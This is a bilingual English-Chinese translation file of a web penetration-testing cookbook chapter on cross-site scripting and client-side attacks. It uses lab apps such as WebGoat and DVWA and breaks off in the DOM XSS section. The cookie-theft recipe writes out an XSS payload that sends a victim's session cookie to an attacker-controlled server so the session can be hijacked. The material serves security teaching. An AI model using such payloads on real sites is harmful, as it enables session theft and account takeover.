- en: Cross-Site Scripting and Client-Side Attacks
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 跨站脚本和客户端攻击
- en: 'In this chapter, we will cover:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 本章内容包括：
- en: Bypassing client-side controls using the browser
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用浏览器绕过客户端控制
- en: Identifying Cross-Site Scripting vulnerabilities
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 识别跨站脚本（XSS）漏洞
- en: Obtaining session cookies through XSS
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过XSS获取会话Cookies
- en: Exploiting DOM XSS
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用DOM XSS
- en: Man-in-the-Browser attack with XSS and BeEF
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用XSS和BeEF进行浏览器中人攻击
- en: Extracting information from web storage
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从Web存储中提取信息
- en: Testing WebSockets with ZAP
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用ZAP测试WebSockets
- en: Using XSS and Metasploit to get a remote shell
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用XSS和Metasploit获取远程Shell
- en: Introduction
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 介绍
- en: The main difference between web applications and other types of application
    is that web applications don't have software or a user interface installed on
    the client, so the browser plays the role of client on the user's device.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: Web应用与其他类型应用的主要区别在于，Web应用不在客户端安装软件或用户界面，因此浏览器在用户设备上充当客户端角色。
- en: In this chapter, we will focus on vulnerabilities that take advantage of the
    fact that the browser is a code interpreter that reads HTML and scripting code,
    and displays the result to users, as well as allowing them to interact with the
    server via HTTP requests and more recently WebSockets, an addition to the latest
    version of the HTML language, HTML5.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将重点讲解利用浏览器作为代码解释器的漏洞，浏览器读取HTML和脚本代码并显示结果给用户，同时允许用户通过HTTP请求与服务器交互，最近的WebSockets（HTML5的最新版本中的一种补充）也被广泛使用。
- en: Bypassing client-side controls using the browser
  id: totrans-13
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用浏览器绕过客户端控制
- en: Processing in web applications happens both on the server side and the client
    side. The latter is often used to do things related to how information is presented
    to the user; also, input validation and some authorization tasks are performed
    client-side. When these validation and authorization checks are not reinforced
    by a similar server-side process, we may face a security problem, as client-side
    information and processing is easily manipulable by users.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: Web应用的处理既发生在服务器端，也发生在客户端。后者通常用于处理与信息展示相关的内容；此外，输入验证和某些授权任务是在客户端执行的。当这些验证和授权检查没有通过类似的服务器端过程来加强时，可能会面临安全问题，因为客户端信息和处理容易被用户操控。
- en: In this recipe, we will see a couple of situations where a malicious user can
    take advantage of client-side controls that are not backed up by server-side counterparts.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们将看到几个情况，恶意用户可以利用那些没有服务器端支持的客户端控制。
- en: How to do it...
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Let''s look at a practical example using WebGoat:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 我们来看一个使用WebGoat的实际示例：
- en: 'Log in to WebGoat and go to Access Control Flaws | LAB Role Based Access Control
    | Stage 1: Bypass Business Layer Access Control:'
  id: totrans-18
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录WebGoat并进入访问控制漏洞 | LAB基于角色的访问控制 | 第一阶段：绕过业务层访问控制：
- en: '![](assets/9dd62eed-bbfc-436d-b0e4-f337071a7dac.png)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9dd62eed-bbfc-436d-b0e4-f337071a7dac.png)'
- en: Use Tomcat's credentials (`Tom`:`tom`) to log in and enable Firefox's Developer
    Tools (*F12*).
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用Tomcat的凭证（`Tom`:`tom`）登录并启用Firefox的开发者工具（*F12*）。
- en: 'Let''s inspect the list of employees. We can see that the only element, `Tom
    Cat (employee)`, is an option HTML tag with the value `105`:'
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们检查员工列表。我们可以看到唯一的元素`Tom Cat (employee)`是一个值为`105`的HTML选项标签：
- en: '![](assets/fbe586c9-1272-41b4-9800-27a18042f624.png)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/fbe586c9-1272-41b4-9800-27a18042f624.png)'
- en: 'Go to the Network tab in Developer Tools and click on ViewProfile. Notice how
    the request has a parameter called `employee_id` and its value is `105`:'
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开开发者工具中的Network选项卡并点击ViewProfile。注意请求中有一个名为`employee_id`的参数，它的值是`105`：
- en: '![](assets/b42eb2ac-e5af-41cf-a1d9-2d3dab829d80.png)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b42eb2ac-e5af-41cf-a1d9-2d3dab829d80.png)'
- en: Click on ListStaff to go back to the list.
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击ListStaff返回列表。
- en: Change to the Inspector tab in Developer Tools.
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 切换到开发者工具中的Inspector选项卡。
- en: Double-click on the value (`105`) of the `option` tag and change it to `101`.
    We want to see whether it is possible to look at other users' information by changing
    this parameter.
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 双击`option`标签的值（`105`）并将其更改为`101`。我们想看看通过修改这个参数是否可以查看其他用户的信息。
- en: 'Click on ViewProfile again:'
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 再次点击ViewProfile：
- en: '![](assets/58598342-59d4-4262-b9cb-aa7246fe889f.png)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/58598342-59d4-4262-b9cb-aa7246fe889f.png)'
- en: Now, the task in WebGoat is to delete Tom's profile using his own account, so
    let's try that. Click on ListStaff to go back to the list.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，WebGoat中的任务是使用Tom的账户删除Tom的个人资料，让我们来尝试一下。点击ListStaff返回列表。
- en: Now, inspect the ViewProfile button.
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，检查ViewProfile按钮。
- en: 'Notice how its name is `action` and its value is ViewProfile; change the value
    to DeleteProfile:'
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 请注意，它的名称是`action`，值是ViewProfile；将值更改为DeleteProfile：
- en: '![](assets/418a6c86-11b5-4595-9d99-cdfd40685a9b.png)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/418a6c86-11b5-4595-9d99-cdfd40685a9b.png)'
- en: 'The text in the button will change. Click DeleteProfile and this stage will
    be completed:'
  id: totrans-34
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 按钮中的文本将会改变。点击DeleteProfile，当前阶段将完成：
- en: '![](assets/76ebc91d-182e-41fc-9e65-ca8b8537efff.png)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/76ebc91d-182e-41fc-9e65-ca8b8537efff.png)'
- en: How it works...
  id: totrans-36
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: In this recipe, we first noticed that the employee IDs are given to the client
    as values in a list and sent to the server as request parameters, so we tried
    and changed the `employee_id` parameter to get information from an employee we
    shouldn't have access to.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个案例中，我们首先注意到，员工ID作为值提供给客户端，并作为请求参数发送到服务器，因此我们尝试并更改了`employee_id`参数，以获取我们不应访问的员工信息。
- en: After that, we noticed, by checking the Inspector, that all buttons have the
    same name, `action`, and their values are the action to be taken when pressed.
    This can be confirmed by checking the requests in the Network tab of the Developer
    Tools. So, if we have actions such as `SearchStaff`, `ViewProfile`, and `ListStaff`,
    maybe `DeleteProfile` would do the thing the challenge asks for. After we changed
    the `ViewProfile` button's value and clicked on it, we verified our assumption
    was correct, and we can delete any user (or perform any action) in this application
    by manipulating the values of the HTML elements with the tools any web browser
    includes.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，我们通过检查检查器，注意到所有按钮的名称都是`action`，它们的值是按下时执行的操作。通过检查开发者工具的网络标签中的请求，可以确认这一点。因此，如果我们有像`SearchStaff`、`ViewProfile`和`ListStaff`这样的操作，也许`DeleteProfile`就是挑战所要求的操作。当我们更改了`ViewProfile`按钮的值并点击它时，我们验证了我们的假设是正确的，凭借修改HTML元素值的能力，我们可以删除任何用户（或执行任何操作）——这正是任何Web浏览器提供的工具所能做到的。
- en: See also
  id: totrans-39
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: Mutillidae II, also included in OWASP BWA, has a very interesting challenge
    for client-side control bypasses. It's recommended the reader tries it.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: Mutillidae II，也包含在OWASP BWA中，有一个非常有趣的挑战，旨在绕过客户端控制。推荐读者尝试这个挑战。
- en: Identifying Cross-Site Scripting vulnerabilities
  id: totrans-41
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 识别跨站脚本攻击漏洞
- en: '**Cross-Site Scripting** (**XSS**) is one of the most common vulnerabilities
    in web applications; in fact, it is considered third in the OWASP Top 10 from
    2013 ([https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)).'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: '**跨站脚本攻击**（**XSS**）是Web应用程序中最常见的漏洞之一；事实上，它被认为是2013年OWASP前十大漏洞中的第三大漏洞（[https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)）。'
- en: In this recipe, we will see some key points in identifying an XSS vulnerability
    in a web application.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个案例中，我们将看到一些识别Web应用程序中XSS漏洞的关键点。
- en: How to do it...
  id: totrans-44
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Let''s look at the following steps:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看一下以下步骤：
- en: We will use **Damn Vulnerable Web Application** (**DVWA**) for this recipe.
    Log in using the default admin credentials (`admin` as both username and password)
    and go to XSS reflected.
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将使用**Damn Vulnerable Web Application**（**DVWA**）进行这个案例。使用默认的管理员凭据（用户名和密码均为`admin`）登录，然后进入XSS反射部分。
- en: 'The first step in testing for a vulnerability is to observe the normal response
    of the application. Introduce a name in the textbox and click Submit. We will
    use `Bob`:'
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 测试漏洞的第一步是观察应用程序的正常响应。在文本框中输入一个名称并点击提交。我们将使用`Bob`：
- en: '![](assets/62b99806-25ad-4183-b59a-eccb1ac3996d.png)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/62b99806-25ad-4183-b59a-eccb1ac3996d.png)'
- en: 'The application used the name we provided to form a phrase. What happens if
    instead of a valid name we introduce some special characters or numbers? Let''s
    try with `*<*''this is the 1st test''*>*`:'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用程序使用我们提供的名称来形成一个短语。如果我们引入一些特殊字符或数字，而不是有效的名称，会发生什么呢？我们来试试`*<*'this is the 1st
    test'*>*`：
- en: '![](assets/d42e50ee-96f9-4319-a047-fec22aa13f99.png)'
  id: totrans-50
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d42e50ee-96f9-4319-a047-fec22aa13f99.png)'
- en: 'Now, we see that anything we put in the textbox will be reflected in the response;
    that is, it is becoming the part of the HTML page in response. Let''s check the
    page''s source code to analyze how it presents the information:'
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们看到任何我们输入到文本框中的内容都会反映在响应中；也就是说，它正在成为响应中的HTML页面的一部分。让我们查看页面的源代码，分析它是如何展示信息的：
- en: '![](assets/22f84bcc-9eb0-46ab-859b-e16396defae9.png)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/22f84bcc-9eb0-46ab-859b-e16396defae9.png)'
- en: The source code shows that there is no encoding for special characters in the
    output and the special characters we send are reflected back in the page without
    any prior processing. The `*< *`and `*>*` symbols are the ones used to define
    HTML tags, so maybe we can introduce some script code.
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 源代码显示，输出中的特殊字符没有进行编码处理，我们发送的特殊字符直接反射回页面，且没有任何预处理。`*< *`和`*>*`符号是用来定义HTML标签的，因此也许我们可以输入一些脚本代码。
- en: 'Try introducing a name followed by very simple script code, `Bob<script>alert(''XSS'')</script>`:'
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 尝试输入一个名字，后面跟上非常简单的脚本代码，`Bob<script>alert('XSS')</script>`：
- en: '![](assets/7a363f68-861b-4b81-9d90-5a92896de440.png)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/7a363f68-861b-4b81-9d90-5a92896de440.png)'
- en: The page executed the script, causing an alert to appear, so this page is vulnerable
    to XSS.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 页面执行了脚本，导致弹出了警告框，所以这个页面存在XSS漏洞。
- en: 'Now, check the source code to see what happened with our input:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，查看源代码，看看我们的输入发生了什么：
- en: '![](assets/3d3203d7-d853-4b65-9c28-9c1fae4ae812.png)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3d3203d7-d853-4b65-9c28-9c1fae4ae812.png)'
- en: It looks like our input was processed as if it was a part of the HTML code;
    the browser interpreted the `<script>` tag and executed the code inside it, showing
    the alert as we set it.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来我们的输入被处理成了HTML代码的一部分；浏览器解释了`<script>`标签，并执行了其中的代码，显示了我们设置的警告框。
- en: How it works...
  id: totrans-60
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: XSS vulnerabilities happen when weak or no input validation is done and there
    is no proper encoding of the output, both on the server side and client side.
    This means that the application allowed us to introduce characters that are also
    used in HTML code and, when it was going to send them to the page, did not follow
    any encoding process (such as using the HTML escape codes `&lt;` and `&gt;`) to
    prevent them from being interpreted as HTML or JavaScript source code.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: XSS漏洞发生在输入验证不严格或没有输入验证时，且输出没有适当编码时，无论是在服务器端还是客户端。这意味着应用程序允许我们输入在HTML代码中也能使用的字符，并且在发送到页面时没有执行任何编码处理（例如使用HTML转义码`&lt;`和`&gt;`），以防止它们被当作HTML或JavaScript源代码解析。
- en: These vulnerabilities are used by attackers to alter the way a page behaves
    on the client side and to trick users into performing tasks without them knowing,
    or to steal private information.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者利用这些漏洞改变页面在客户端的行为，欺骗用户在不知情的情况下执行任务，或窃取私人信息。
- en: 'To discover the existence of an XSS vulnerability, we followed some leads:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 为了发现XSS漏洞，我们跟踪了一些线索：
- en: The text we introduced in the box was used exactly as sent to form a message
    that was presented on the page; that is, it is a reflection point
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们在框中输入的文本被准确地用来形成一个显示在页面上的消息；也就是说，这是一个反射点。
- en: Special characters were not encoded or escaped
  id: totrans-65
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 特殊字符没有被编码或转义
- en: The source code showed that our input was integrated in a position where it
    could become a part of the HTML code and be interpreted as that by the browser
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 源代码显示我们的输入被集成到了一个可以成为HTML代码一部分的位置，并且浏览器会将其作为HTML代码解析。
- en: There's more...
  id: totrans-67
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: In this recipe, we discovered a reflected XSS; this means that the script is
    executed every time we send this request and the server responds to it. Another
    type of XSS is called a stored XSS. A stored XSS is one that may or may not be
    presented immediately after input submission, but such input is stored on the
    server (maybe in a database) and is executed every time a user accesses the stored
    data.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们发现了一个反射型XSS；这意味着每次我们发送这个请求并且服务器响应时，脚本都会执行。另一种XSS类型被称为存储型XSS。存储型XSS可能在输入提交后不立即呈现，但这些输入会被存储在服务器上（可能是数据库中），并在每次用户访问存储的数据时执行。
- en: Obtaining session cookies through XSS
  id: totrans-69
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过XSS获取会话cookie
- en: In the previous recipe, we did a very basic proof of concept for an XSS exploitation.
    Also, in previous chapters, we saw how a session cookie can be used by an attacker
    to steal a valid user's session. XSS vulnerabilities and session cookies that
    are not protected by the `HttpOnly` flag can be a deadly combination for a web
    application's security.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的示例中，我们进行了一次非常基础的XSS利用原型测试。此外，在之前的章节中，我们看到了攻击者如何使用会话cookie窃取有效用户的会话。没有`HttpOnly`标志保护的XSS漏洞和会话cookie，可能是对Web应用程序安全的致命组合。
- en: In this recipe, we will see how an attacker can exploit an XSS vulnerability
    to grab a user's session cookie.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们将看到攻击者如何利用XSS漏洞获取用户的会话cookie。
- en: How to do it...
  id: totrans-72
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'The attacker needs to have a server to receive the exfiltrated data (session
    cookies, in this case), so we will use a simple Python module to set it up. These
    are the steps:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者需要有一个服务器来接收外泄的数据（在这个例子中是会话cookie），因此我们将使用一个简单的Python模块来设置它。以下是步骤：
- en: 'To start a basic HTTP server with Python, run the following command in a Terminal
    in Kali Linux:'
  id: totrans-74
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要使用Python启动一个基本的HTTP服务器，请在Kali Linux的终端中运行以下命令：
- en: '![](assets/d3290beb-bd98-4ced-89cf-a10766e7186d.png)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d3290beb-bd98-4ced-89cf-a10766e7186d.png)'
- en: Now log in to DVWA and go to XSS reflected.
  id: totrans-76
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在登录到DVWA并进入XSS反射攻击。
- en: 'Enter the following payload in the Name textbox:'
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在名称文本框中输入以下有效负载：
- en: '[PRE0]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: '![](assets/55350ad2-5d35-487a-aa21-ef9dbb4db8ef.png)'
  id: totrans-79
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/55350ad2-5d35-487a-aa21-ef9dbb4db8ef.png)'
- en: 'Now, go back to the Terminal where the Python server is running and see how
    it has received a new request:'
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，返回到正在运行Python服务器的终端，查看它如何接收到新的请求：
- en: '![](assets/174cb73f-6f7d-4623-a2a3-82a299c6f092.png)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/174cb73f-6f7d-4623-a2a3-82a299c6f092.png)'
- en: Notice that the URL parameter (after `GET`) contains the user's session cookie.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，URL参数（在`GET`之后）包含了用户的会话cookie。
- en: How it works...
  id: totrans-83
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: In attacks such as XSS, where user interaction is required in order to exploit
    a vulnerability, attackers have little or no control over when the user clicks
    the malicious link or performs the action required to compromise the application.
    In such a scenario, the attacker should have a server set up to receive the information
    sent by the victim.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 在像XSS这样的攻击中，需要用户交互才能利用漏洞，攻击者通常无法控制用户何时点击恶意链接或执行导致应用程序受到威胁的操作。在这种情况下，攻击者应该设置一个服务器来接收受害者发送的信息。
- en: In this example, we used the `SimpleHTTPServer` module provided by Python, but
    a more sophisticated attack would obviously require a more sophisticated server.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们使用了Python提供的`SimpleHTTPServer`模块，但更复杂的攻击显然需要更复杂的服务器。
- en: After that, going to DVWA and entering the payload in the Name textbox simulates
    a user clicking on a link to `http://192.168.56.11/dvwa/vulnerabilities/xss_r/?name=Bob<script>document.write('<img
    src="http://192.168.56.10:88/'+document.cookie+'">');</script> `sent by an attacker.
    Once the user's browser loads the page and interprets the payload as JavaScript
    code, it will try to access an image stored on the attacker's server (`http://192.168.56.10:88`,
    our Kali VM) with the value of the cookie as the filename. The attacker's server
    will register this request and return a 404 Not found error; they can then take
    the logged session cookie and use it to hijack the user's session.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，进入DVWA并在名称文本框中输入有效负载，模拟用户点击攻击者发送的链接`http://192.168.56.11/dvwa/vulnerabilities/xss_r/?name=Bob<script>document.write('<img
    src="http://192.168.56.10:88/'+document.cookie+'">');</script>`。一旦用户的浏览器加载页面并将有效负载解析为JavaScript代码，它将尝试访问存储在攻击者服务器上的图片（`http://192.168.56.10:88`，即我们的Kali虚拟机），其中cookie的值作为文件名。攻击者的服务器将注册此请求并返回404
    Not Found错误；然后，攻击者可以获取记录的会话cookie，并利用它劫持用户的会话。
- en: See also
  id: totrans-87
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: 'In this recipe, we used the `<script>` tag to inject a JavaScript code block
    into the page; however, this is not the only HTML tag we can use, especially with
    the additions made by HTML5, where we have `<video>` and `<audio>`, for example.
    Let''s see some other payloads we could have used to exploit XSS:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们使用了`<script>`标签将JavaScript代码块注入到页面中；然而，这并不是我们唯一可以使用的HTML标签，特别是在HTML5的新增标签中，例如`<video>`和`<audio>`。让我们看看一些其他的有效负载，看看如何利用XSS漏洞：
- en: 'Generating an error event on tags with an `src/source` parameter, such as `<img>`, `<audio>`,
    and `<video>`:'
  id: totrans-89
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在带有`src/source`参数的标签（如`<img>`、`<audio>`和`<video>`）上生成错误事件：
- en: '[PRE1]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Or, use the following:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，使用以下方法：
- en: '[PRE2]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Or, there is also this:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，这也是一种方法：
- en: '[PRE3]'
  id: totrans-94
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Injecting a `<script>` tag that loads an external JavaScript file:'
  id: totrans-95
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 注入一个加载外部JavaScript文件的`<script>`标签：
- en: '[PRE4]'
  id: totrans-96
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'If the injected text is set as a value inside an HTML tag and surrounded by
    quotes (`"`), like in `<input value="injectable_text">`, we can close the quotes
    and add an event to the code. For example, replace `injectable_text` with the
    following code. Notice how the last quote is not closed so we can use the one
    already in the HTML code:'
  id: totrans-97
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 如果注入的文本作为HTML标签中的值，并被引号（`"`）包围，例如`<input value="injectable_text">`，我们可以关闭引号并向代码中添加事件。例如，将`injectable_text`替换为以下代码。注意，最后一个引号没有关闭，因此我们可以使用HTML代码中已存在的那个引号：
- en: '[PRE5]'
  id: totrans-98
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Injecting a link or other tag with the `href` property to make it execute code
    whenever it is clicked:'
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 注入一个链接或其他带有`href`属性的标签，使其在被点击时执行代码：
- en: '[PRE6]'
  id: totrans-100
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'There are a multitude of variations of tags, encodings, and instructions that
    can be used to exploit an XSS vulnerability. For a more complete reference, see
    the OWASP XSS Filter Evasion Cheat Sheet: [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 有许多种标签、编码和指令的变种可以用来利用XSS漏洞。更多的参考资料，请查看OWASP XSS过滤器绕过备忘单：[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)。
- en: Exploiting DOM XSS
  id: totrans-102
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用DOM XSS
- en: Also referred to as client-side XSS, DOM XSS is named this way because the payload
    is received and processed by the DOM of the browser, which means that the injected
    code never reaches the server and any server-side validation or encoding is ineffective
    against this kind of attack.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 也称为客户端XSS，DOM XSS之所以这样命名，是因为有效载荷由浏览器的DOM接收和处理，这意味着注入的代码永远不会到达服务器，任何服务器端的验证或编码都无法防御这种攻击。
- en: In this recipe, we will analyze how this vulnerability can be detected and exploited
    in a web application.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个案例中，我们将分析如何在Web应用程序中检测和利用这个漏洞。
- en: How to do it...
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何执行……
- en: 'The following are the steps for detecting and exploiting this vulnerability
    in a web application:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是检测和利用此漏洞的步骤：
- en: In the vulnerable virtual machine `vm_1`, go to Mutillidae II | Top 10 2013
    | XSS | DOM | HTML5 local storage.
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在易受攻击的虚拟机`vm_1`中，进入Mutillidae II | Top 10 2013 | XSS | DOM | HTML5本地存储。
- en: This exercise shows a form that stores information in the browser's local and
    session storage. Enable the Developer Tools in the Network tab.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这个练习展示了一个表单，它将信息存储在浏览器的本地存储和会话存储中。在网络选项卡中启用开发者工具。
- en: 'Try adding some data and notice how there is no network communication, and
    that the green bar displays the value given to the key:'
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 尝试添加一些数据，注意到没有网络通信，并且绿色进度条显示给定键的值：
- en: '![](assets/6797d3dc-0c96-46c7-97c6-ea0fafecefd3.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6797d3dc-0c96-46c7-97c6-ea0fafecefd3.png)'
- en: 'If we inspect the Add New button, we see it calls a function, `addItemToStorage`,
    when clicked:'
  id: totrans-111
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果我们检查“添加新项目”按钮，我们会看到它在点击时调用一个函数，`addItemToStorage`：
- en: '![](assets/eec77323-107e-4db0-81d8-500267564a90.png)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/eec77323-107e-4db0-81d8-500267564a90.png)'
- en: 'Now, go to the Debugger tab and look for the `addItemToStorage` function; we
    find it in line 1064 of `index.php`:'
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，转到调试器选项卡，查找`addItemToStorage`函数；我们在`index.php`的第1064行找到了它：
- en: '![](assets/260b3c84-0cb2-4cd2-b6bc-d0beedff5520.png)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/260b3c84-0cb2-4cd2-b6bc-d0beedff5520.png)'
- en: The arrow with number 1 shows that there is some input validation in place,
    but it depends on the value of a variable called `gUseJavaScriptValidation`. If
    we look for this variable in the code, we find it is initially declared with the
    value `FALSE` (line 1027) and there doesn't seem to be any place where its value
    changes, so maybe that condition is never true. We follow the code flow and find
    that there's no other validation or modification of the variable that holds the
    value of the key. And in **2**, line 1093, that value is passed as a parameter
    to the `setMessage` function, which in line 1060 **3**, adds the message to the
    page by using the `innerHTML` property of an existing element.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
